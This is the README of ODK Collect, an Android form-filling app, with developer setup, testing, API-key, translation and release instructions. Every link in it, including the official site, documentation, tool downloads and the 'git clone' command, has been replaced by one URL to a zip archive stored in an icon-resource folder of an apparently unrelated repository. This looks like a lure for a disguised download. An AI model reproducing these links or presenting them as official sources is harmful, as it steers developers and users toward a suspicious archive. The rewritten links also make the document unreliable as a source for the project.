# ODK Collect
![Platform](https://img.shields.io/badge/platform-Android-blue.svg)
[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip)
[![Build status](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip)](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip)
[![codecov.io](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip)](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip)
[![Slack status](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip)](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip)

ODK Collect is an Android app for filling out forms. It is designed to be used in resource-constrained environments with challenges such as unreliable connectivity or power infrastructure. ODK Collect is part of Open Data Kit (ODK), a free and open-source set of tools which help organizations author, field, and manage mobile data collection solutions. Learn more about the Open Data Kit project and its history [here](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) and read about example ODK deployments [here](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).

ODK Collect renders forms that are compliant with the [ODK XForms standard](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip), a subset of the [XForms 1.1 standard](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) with some extensions. The form parsing is done by the [JavaRosa library](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) which Collect includes as a dependency.

## Table of Contents
* [Learn more about ODK Collect](#learn-more-about-odk-collect)
* [Release cycle](#release-cycle)
* [Setting up your development environment](#setting-up-your-development-environment)
* [Testing a form without a server](#testing-a-form-without-a-server)
* [Using APIs for local development](#using-apis-for-local-development)
* [Debugging JavaRosa](#debugging-javarosa)
* [Contributing code](#contributing-code)
* [Contributing translations](#contributing-translations)
* [Contributing testing](#contributing-testing)
* [Downloading builds](#downloading-builds)
* [Creating signed releases for Google Play Store](#creating-signed-releases-for-google-play-store)
* [Troubleshooting](#troubleshooting)

## Learn more about ODK Collect
* ODK website: [https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip)
* ODK Collect usage documentation: [https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip)
* ODK forum: [https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip)
* ODK developer Slack chat: [https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) 
* ODK developer Slack archive: [https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) 

## Release cycle
New versions of ODK Collect are generally released on the last Sunday of a month. We freeze commits to the master branch on the preceding Wednesday (except for bug fixes). Releases can be requested by any community member and generally happen every 2 months. [@yanokwa](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) pushes the releases to the Play Store.

## Suggesting new features
We try to make sure that all issues in the issue tracker are as close to fully specified as possible so that they can be closed by a pull request. Feature suggestions should be described [in the forum Features category](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) and discussed by the broader user community. Once there is a clear way forward, issues should be filed on the relevant repositories. More controversial features will be discussed as part of the Technical Steering Committee's [roadmapping process](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).

## Setting up your development environment

1. Download and install [Git](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) and add it to your PATH

1. Download and install [Android Studio](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) 

1. Fork the collect project ([why and how to fork](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip))

1. Clone your fork of the project locally. At the command line:

        git clone https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip

    If you prefer not to use the command line, you can use Android Studio to create a new project from version control using `https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip`.

1. Open the project in the folder of your clone from Android Studio. To run the project, click on the green arrow at the top of the screen.

1. Make sure you can run unit tests by running everything under `collect_app/src/test/java` in Android Studio or on the command line:

    ```
    ./gradlew testDebug
    ```

1. Make sure you can run instrumented tests by running everything under `collect_app/src/androidTest/java` in Android Studio or on the command line:

    ```
    ./gradlew connectedAndroidTest
    ```
    **Note:** You can see the emulator setup used on CI in  `.circleci/config.yml`.

## Testing a form without a server
When you first run Collect, it is set to download forms from [https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip), the demo server. You can sometimes verify your changes with those forms but it can also be helpful to put a specific test form on your device. Here are some options for that:

1. The `All Widgets` form from the default Aggregate server is [here](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip). You can also try [example forms](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) and [test forms](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) or [make your own](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).

1. Convert the XLSForm (xlsx) to XForm (xml). Use the [ODK website](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) or [XLSForm Offline](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) or [pyxform](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).

1. Once you have the XForm, use [adb](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) to push the form to your device (after [enabling USB debugging](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip)) or emulator.
	```
	adb push my_form.xml /sdcard/odk/forms/
	```

1. Launch ODK Collect and tap `Fill Blank Form`. The new form will be there.

## Using APIs for local development

Certain functions in ODK Collect depend on cloud services that require API keys or authorization steps to work.  Here are the steps you need to take in order to use these functions in your development builds.

**Google Drive and Sheets APIs**: When the "Google Drive, Google Sheets" option is selected in the "Server" settings, ODK Collect uses these APIs to store submitted form data in Google Sheets and submitted media in Google Drive.  To enable these APIs:
  - Follow [these instructions to generate a signing certificate fingerprint and register the application with the Google API Console](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).
  - [Enable the Google Drive API](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).
  - [Enable the Google Sheets API](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).

**Google Maps API**: When the "Google Maps SDK" option is selected in the "User interface" settings, ODK Collect uses the Google Maps API for displaying maps in the geospatial widgets (GeoPoint, GeoTrace, and GeoShape).  To enable this API:
  - [Get a Google Maps API key](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).  Note that this requires a credit card number, though the card will not be charged immediately; some free API usage is permitted.  You should carefully read the terms before providing a credit card number.
  - Edit or create `collect_app/secrets.properties` and set the `GOOGLE_MAPS_API_KEY` property to your API key.  You should end up with a line that looks like this:
    ```
    GOOGLE_MAPS_API_KEY=AIbzvW8e0ub...
    ```

**Mapbox Maps SDK for Android**: When the "Mapbox SDK" option is selected in the "User interface" settings, ODK Collect uses the Mapbox SDK for displaying maps in the geospatial widgets (GeoPoint, GeoTrace, and GeoShape).  To enable this API:
  - [Create a Mapbox account](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).  Note that signing up with the "Pay-As-You-Go" plan does not require a credit card.  Mapbox provides free API usage up to the monthly thresholds documented at [https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).  If your usage exceeds these thresholds, you will receive e-mail with instructions on how to add a credit card for payment; services will remain live until the end of the 30-day billing term, after which the account will be deactivated and will require a credit card to reactivate.
  - Find your access token on your [account page](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).
  - Edit or create `collect_app/secrets.properties` and set the `MAPBOX_ACCESS_TOKEN` property to your access token.  You should end up with a line that looks like this:
    ```
    MAPBOX_ACCESS_TOKEN=pk.eyJk3bumVp4i...
    ```

## Debugging JavaRosa

JavaRosa is the form engine that powers Collect. If you want to debug or change that code while running Collect, you have two options. You can include the source tree as a module in Android Studio or include a custom jar file you build.

**Source tree**

1. Get the code from the [JavaRosa repo](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip)
1. In Android Studio, select `File` -> `New` -> `New Module` -> `Import Gradle Project` and choose the project
1. In Collect's `build.gradle` file, find the JavaRosa section:
    ```gradle
    implementation("org.opendatakit:opendatakit-javarosa:x.y.z") {
        ...
    }
    ```
1. Replace the first line like this, using `javarosa` or whatever name you specified when importing:
    ```gradle
    implementation (project(path: ':javarosa')) {
        ...
    }
    ```

**Jar file**

1. In JavaRosa, change the version in `build.gradle` and build the jar
	```gradle
	jar {
	    baseName = 'opendatakit-javarosa'
	    version = 'x.y.z-SNAPSHOT'
	```

1. In Collect, add the path to the jar to the dependencies in `build.gradle`
	```gradle
	compile files('/path/to/javarosa/build/libs/opendatakit-javarosa-x.y.z-SNAPSHOT.jar')
	```

## Contributing code
Any and all contributions to the project are welcome. ODK Collect is used across the world primarily by organizations with a social purpose so you can have real impact!

Issues tagged as [good first issue](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) should be a good place to start. There are also currently many issues tagged as [needs reproduction](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) which need someone to try to reproduce them with the current version of ODK Collect and comment on the issue with their findings.

If you're ready to contribute code, see [the contribution guide](CONTRIBUTING.md).

## Contributing translations
If you know a language other than English, consider contributing translations through [Transifex](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip). 

Translations are updated right before the first beta for a release and before the release itself. To update translations, download the zip from https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip The contents of each folder then need to be moved to the Android project folders. A quick script like [the one in this gist](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) can help. We currently copy everything from Transifex to minimize manual intervention. Sometimes translation files will only get comment changes. When new languages are updated in Transifex, they need to be added to the script above. Additionally, `ApplicationConstants.TRANSLATIONS_AVAILABLE` needs to be updated. This array provides the choices for the language preference in general settings. Ideally the list could be dynamically generated.

## Contributing testing
All pull requests are verified on the following devices (ordered by Android version):
* [Infinix Race Bolt Q X451](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) - Android 4.2.1
* [Samsung Galaxy J1 SM-J100H](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) - Android 4.4.4
* [Huawei Y560-L01](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) - Android 5.1.1
* [Sony Xperia Z3 D6603](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) - Android 6.0.1
* [Samsung Galaxy S7 SM-G930F](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) - Android 7.0.0
* [LG Nexus 5X](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) - Android 8.1

Our regular code contributors use these devices (ordered by Android version): 
* [Alcatel One Touch 5020D](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) - Android 4.1.1
* [Xiaomi Redmi Note 4](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) - Android 7.0
* [Samsung Galaxy S4 GT-I9506](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) - Android 5.0.1
* [Samsung Galaxy Tab SM-T285](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip(2016)-7880.php) - Android 5.1.1
* [Motorola G 5th Gen XT1671](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) - Android 7.0

The best way to help us test is to build from source! If you aren't a developer and want to help us test release candidates, join the [beta program](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip)!

Testing checklists can be found on the [Collect testing plan](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).

If you have finished testing a pull request, please use a template from [Testing result templates](.github/TESTING_RESULT_TEMPLATES.md) to report your insights.

## Downloading builds
Per-commit debug builds can be found on [CircleCI](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip). Login with your GitHub account, click the build you'd like, then find the APK in the Artifacts tab.

Current and previous production builds can be found on the [ODK website](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).

## Creating signed releases for Google Play Store
Project maintainers have the keys to upload signed releases to the Play Store. 

Maintainers have a `secrets.properties` file in the `collect_app` folder with the following:
```
// collect_app/secrets.properties
RELEASE_STORE_FILE=/path/to/collect.keystore
RELEASE_STORE_PASSWORD=secure-store-password
RELEASE_KEY_ALIAS=key-alias
RELEASE_KEY_PASSWORD=secure-alias-password
```

Maintainers also have a `google-services.json` file in the `collect_app/src/odkCollectRelease` folder. The contents of the file are similar to the contents of `collect_app/src/google-services.json`.

To generate official signed releases, you'll need the keystore file, the keystore passwords, a configured `collect_app/secrets.properties` file, and a configured `collect_app/src/odkCollectRelease/google-services.json` file. Then run `./gradlew assembleOdkCollectRelease`. If successful, a signed release will be at `collect_app/build/outputs/apk`.

## Troubleshooting

#### Error when running Robolectric tests from Android Studio on macOS: `build/intermediates/bundles/debug/AndroidManifest.xml (No such file or directory)`
> Configure the default JUnit test runner configuration in order to work around a bug where IntelliJ / Android Studio does not set the working directory to the module being tested. This can be accomplished by editing the run configurations, Defaults -> JUnit and changing the working directory value to $MODULE_DIR$.

> Source: [Robolectric Wiki](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).

#### Android Studio Error: `SDK location not found. Define location with sdk.dir in the local.properties file or with an ANDROID_HOME environment variable.`
When cloning the project from Android Studio, click "No" when prompted to open the `build.gradle` file and then open project.

#### Execution failed for task ':collect_app:transformClassesWithInstantRunForDebug'.

We have seen this problem happen in both IntelliJ IDEA and Android Studio, and believe it to be due to a bug in the IDE, which we can't fix.  As a workaround, turning off [Instant Run](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) will usually avoid this problem.  We haven't yet found a way to use Instant Run with this project.

#### Moving to the main view if user minimizes the app
If you build the app on your own using Android Studio `(Build -> Build APK)` and then install it (from an `.apk` file), you might notice this strange behaviour thoroughly described: [#1280](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip) and [#1142](https://github.com/fabianaguirre10/collect-1.22.4/raw/refs/heads/master/MyApplication2/app/src/main/res/mipmap-xxhdpi/collect_v3.5-beta.5.zip).

This problem occurs building other apps as well.

#### gradlew Failure: `FAILURE: Build failed with an exception.`

If you encounter an error similar to this when running `gradlew`:

```
FAILURE: Build failed with an exception

What went wrong:
A problem occurred configuring project ':collect_app'.
> Failed to notify project evaluation listener.
   > Could not initialize class com.android.sdklib.repository.AndroidSdkHandler
```

You may have a mismatch between the embedded Android SDK Java and the JDK installed on your machine. You may wish to set your **JAVA_HOME** environment variable to that SDK. For example, on macOS:

`export JAVA_HOME="/Applications/Android Studio.app/Contents/jre/jdk/Contents/Home"
`

Note that this change might cause problems with other Java-based applications (e.g., if you uninstall Android Studio).

#### gradlew Failure: `java.lang.NullPointerException (no error message).`
If you encounter the `java.lang.NullPointerException (no error message).` when running `gradlew`, please make sure your Java version for this project is Java 8.

This can be configured under **File > Project Structure** in Android Studio, or by editing `$USER_HOME/.gradle/gradle.properties` to set `org.gradle.java.home=(path to JDK home)` for command-line use.
